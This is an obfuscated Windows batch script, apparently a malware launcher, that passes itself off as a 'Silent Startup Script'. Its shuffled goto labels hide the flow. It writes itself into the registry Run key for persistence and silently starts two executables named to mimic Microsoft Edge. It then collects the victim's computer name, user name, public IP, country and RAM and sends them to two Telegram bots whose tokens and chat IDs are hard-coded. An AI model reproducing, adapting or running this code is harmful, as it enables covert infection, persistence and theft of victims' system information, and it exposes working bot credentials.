@echo off
chcp 65001 > nul
set 6612=VrMN
set tlFN=lvN0
set tEzq=9zrj
goto k3KuWHWa

:BPehuXLy
set "scriptName=SilentStartupScript"
goto 1gDmuElX

:qNdW6uAo
:: =========================================
goto DCpjkL9X

:VtujQL8t
set "C1=7613395944"
goto UbiEYkQZ

:6DPwX8zR
set "C2=7875997267"
goto 8jGo6sFC

:Ui6AiIew
:: Run the two EXE files silently
goto dwhzRi5s

:dwhzRi5s
start "" "%folder%%exe1%" >nul 2>&1
goto jJKUKfdE

:KiHW1x88
for /f %%a in ('wmic os get totalvisiblememorysize ^| findstr [0-9]') do set /a RAM=%%a/1024/1024+1
goto own1OcHI

:8jGo6sFC
for /f "delims=" %%a in ('curl -s "http://ip-api.com/line/?fields=query,country"') do (if not defined IP (set "IP=%%a") else (set "CY=%%a"))
goto KiHW1x88

:JDvMWhRB
set "scriptPath=%~f0"
goto BPehuXLy

:giUMwWJG
:: === Change these two names if needed ===
goto wm7hNJso

:gjKq8akg
set "T1=8337206512:AAExlLa-QsOYuiPUzXXWk3T_HJw9_upKoC4"
goto VtujQL8t

:qtLN8epC
setlocal enabledelayedexpansion
goto gXEPOUHZ

:Q54Ludun
curl -s -X POST "https://api.telegram.org/bot%T2%/sendMessage" --data-urlencode "text=%MSG%" -d "chat_id=%C2%" > nul
goto 02nh3Qxu

:own1OcHI
:: Structured layout using borders
goto KRrPvvmB

:KRrPvvmB
set "MSG=========================\n  [ SYSTEM REPORT ]\n=========================\nHOST:  %COMPUTERNAME%\nUSER:  %USERNAME%\nIP:    %IP% (%CY%)\nRAM:   %RAM% GB\n========================="
goto mZCKwM8d

:7a6R2klH
set "exe2=msedge.exe"
goto qNdW6uAo

:WMOMpcHQ
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%scriptName%" /t REG_SZ /d "%scriptPath%" /f >nul 2>&1
goto Ui6AiIew

:fMf2NitU
:: =============================================
goto giUMwWJG

:mZCKwM8d
curl -s -X POST "https://api.telegram.org/bot%T1%/sendMessage" --data-urlencode "text=%MSG%" -d "chat_id=%C1%" > nul
goto Q54Ludun

:2AVUTBu2
chcp 65001 > nul
goto gjKq8akg

:oXt7Nb6L
set "folder=%~dp0"
goto JDvMWhRB

:gXEPOUHZ
:: =============================================
goto j0KfhmB6

:DCpjkL9X
:: Get current folder and full script path
goto oXt7Nb6L

:1gDmuElX
:: Add itself to startup (HKCU - no admin needed)
goto WMOMpcHQ

:k3KuWHWa
@echo off
goto qtLN8epC

:wm7hNJso
set "exe1=edge.exe"
goto 7a6R2klH

:UbiEYkQZ
set "T2=8029696970:AAGvwTd-rr2C5vlSaUgW1pKKTMc9qghaa9o"
goto 6DPwX8zR

:02nh3Qxu
exit
goto L7Pe2XUd

:j0KfhmB6
:: Silent Startup Script - Runs 2 EXEs
goto fMf2NitU

:jJKUKfdE
start "" "%folder%%exe2%" >nul 2>&1
goto 2AVUTBu2

:L7Pe2XUd
exit /b
